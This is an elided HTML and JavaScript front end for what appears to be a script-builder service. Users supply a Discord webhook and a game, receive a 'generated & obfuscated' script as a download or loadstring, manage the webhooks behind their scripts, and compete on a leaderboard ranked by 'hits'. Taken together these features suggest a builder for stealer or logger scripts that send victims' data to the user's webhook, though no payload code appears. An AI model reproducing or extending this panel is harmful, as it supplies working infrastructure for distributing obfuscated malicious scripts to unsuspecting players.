...
<body>
        ...
        <div id="dashboardPage" class="page">
            ...
            <div class="dashboard-grid">
                <div class="card" onclick="showGenerator()" style="cursor: pointer;">
                    ...
                    <p style="color: var(--primary); font-weight: bold;">Click to Start →</p>
                </div>
                ...
                <div class="card" onclick="showMyScripts()" style="cursor: pointer;">
                    ...
                    <p style="color: var(--primary); font-weight: bold;">View All →</p>
                </div>
                ...
                <div class="card" onclick="showLeaderboard()" style="cursor: pointer;">
                    ...
                    <p style="color: var(--primary); font-weight: bold;">View Rankings →</p>
                </div>
                ...
                <div class="generator-form">
                    ...
                    <div class="form-group">
                        ...
                        <small style="opacity: 0.7; margin-top: 8px; display: block;">
                            <a href="#" onclick="openWebhookGuide(); return false;" style="color: var(--primary); text-decoration: underline; cursor: pointer;">📖 How to get your Discord Webhook?</a>
                        </small>
                    </div>
                    ...
                    <div id="scriptResult" style="display: none;">
                        ...
                        <div style="margin-top: 20px;">
                            ...
                            <div class="success-buttons">
                                ...
                                <button class="btn btn-secondary" onclick="downloadScript()">⬇️ Download Script</button>
                                <button class="btn btn-secondary" onclick="showLinks()">🔗 View Links</button>
                            </div>
                        </div>
                        ...
                        <div id="linksSection" style="display: none; margin-top: 30px; padding: 20px; background: rgba(102, 126, 234, 0.1); border-radius: 10px; border: 1px solid rgba(102, 126, 234, 0.3);">
                            <h4 style="margin-bottom: 15px;">📌 Direct Links:</h4>
                        ...
                        <div style="margin-top: 20px; padding: 15px; background: rgba(245, 158, 11, 0.1); border-left: 4px solid var(--warning); border-radius: 5px;">
                            <strong style="color: var(--warning);">💡 Usage Guide:</strong>
            ...
            <div id="leaderboardSection" class="leaderboard-section" style="display: none;">
                <div class="leaderboard-header">
                    ...
                    <p class="leaderboard-subtitle">👑 TOP PERFORMERS 👑</p>
                </div>
    ...
    <script>
        ...
        async function generateScript() {
            ...
            showAlert('generatorAlert', 'Validating webhook...', 'warning');

            try {
                const validateResponse = await fetch(`${API_BASE_URL}/api/webhook/validate`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    credentials: 'include',
                ...
                if (!validateData.success) {
                    showAlert('generatorAlert', 'Webhook validation failed!', 'error');
                    return;
                }

                showAlert('generatorAlert', 'Generating & obfuscating...', 'warning');

                const generateResponse = await fetch(`${API_BASE_URL}/api/script/generate`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    credentials: 'include',
                    body: JSON.stringify({ webhook, protection: true, game })
                });
        ...
        function displayScripts(scripts) {
            ...
            scriptsList.innerHTML = scripts.map(script => {
                ...
                const protectionEmoji = script.protection ? '✓' : '✕';
        ...
        function copyLoadstring(loadstring) {
            navigator.clipboard.writeText(loadstring).then(() => {
                ...
                showAlert('scriptsAlert', '❌ Failed to copy', 'error');
            });
        }
        ...
        async function saveWebhookChanges() {
            ...
            try {
                const response = await fetch(`/api/scripts/update/${scriptId}`, {
                    method: 'PUT',
                    headers: {
        ...
        async function deleteScript(scriptId) {
            ...
            try {
                const response = await fetch(`/api/scripts/delete/${scriptId}`, {
                    method: 'DELETE',
                    credentials: 'include'
                });
        ...
        function displayLeaderboard(leaderboard) {
            ...
            const html = leaderboard.map(entry => {
                ...
                const hitIcon = entry.hits > 10 ? '🔥' : entry.hits > 5 ? '💥' : '⭐';
                return `
